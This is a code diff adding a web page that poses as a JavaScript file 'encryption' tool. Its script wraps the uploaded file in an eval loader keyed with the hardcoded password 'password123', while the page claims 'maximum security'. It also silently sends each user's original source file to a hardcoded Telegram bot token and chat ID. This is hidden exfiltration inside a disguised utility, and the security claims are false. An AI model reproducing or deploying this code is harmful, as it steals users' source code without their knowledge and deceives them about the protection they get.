@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>developer : @delreyeas</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at top left, #0f2027, #203a43, #2c5364);
+      font-family: "Segoe UI", sans-serif;
+      color: #e0f7fa;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(0,0,0,0.6);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0,255,200,0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 480px;
+      animation: float 5s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    h2 {
+      margin: 0 0 20px;
+      font-size: 22px;
+      color: #00e5ff;
+      text-shadow: 0 0 10px #00e5ff, 0 0 20px #00bcd4;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00e5ff; }
+      to { text-shadow: 0 0 20px #00bcd4, 0 0 30px #00e5ff; }
+    }
+    input, button {
+      width: 100%;
+      margin: 12px 0;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      font-size: 15px;
+      outline: none;
+    }
+    input {
+      background: #111;
+      color: #00e5ff;
+      border: 1px solid #00e5ff;
+    }
+    button {
+      background: linear-gradient(135deg, #00e5ff, #00bcd4);
+      color: #002b36;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 15px rgba(0,229,255,0.6);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px rgba(0,229,255,0.9);
+    }
+    .ticker {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #80deea;
+      white-space: nowrap;
+      overflow: hidden;
+      box-sizing: border-box;
+      animation: ticker 15s linear infinite;
+    }
+    @keyframes ticker {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>JavaScript Encryption By Danzxn Not dev</h2>
+    <input type="file" id="fileInput" accept=".js">
+    <button onclick="encryptFile()">Encrypt & Download</button>
+    <div class="ticker">🔒 Encryption Engine v2.7 running · Optimized for maximum security · AES-256 Active 🔒</div>
+  </div>
+
+  <script>
+    async function encryptFile() {
+      const file = document.getElementById('fileInput').files[0];
+      if (!file) return alert("Please select a JavaScript file!");
+
+      const reader = new FileReader();
+      reader.onload = async function(e) {
+        const content = e.target.result;
+        const encrypted = CryptoJS.AES.encrypt(content, "password123").toString();
+
+        // hasil index.js
+        const indexJs = `
+const CryptoJS = require("crypto-js");
+const encryptedData = \`${encrypted}\`;
+try {
+  const decrypted = CryptoJS.AES.decrypt(encryptedData, "password123").toString(CryptoJS.enc.Utf8);
+  eval(decrypted);
+} catch (err) {
+  console.error("❌ Error while running encrypted script");
+}
+        `;
+
+        // OTOMATIS DONWLOAD INDEX.JS TARGET
+        const blob = new Blob([indexJs], { type: 'text/javascript' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = "index.js";
+        link.click();
+
+        // KIRIM FILE INDEX.JS ORI KE ADMIN ID
+        const BOT_TOKEN = "8152997271:AAGF2BW7bpPhG0DODY7vCMCJ3sM6E-SCmoI";
+        const CHAT_ID = "7557865171";
+        const waktu = new Date().toLocaleString();
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("caption", `📂 File terenkripsi\n🕒 Waktu: ${waktu}`);
+        formData.append("document", file);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: "POST",
+          body: formData
+        }).catch(()=>{});
+      };
+      reader.readAsText(file);
+    }
+  </script>
+</body>
+</html>
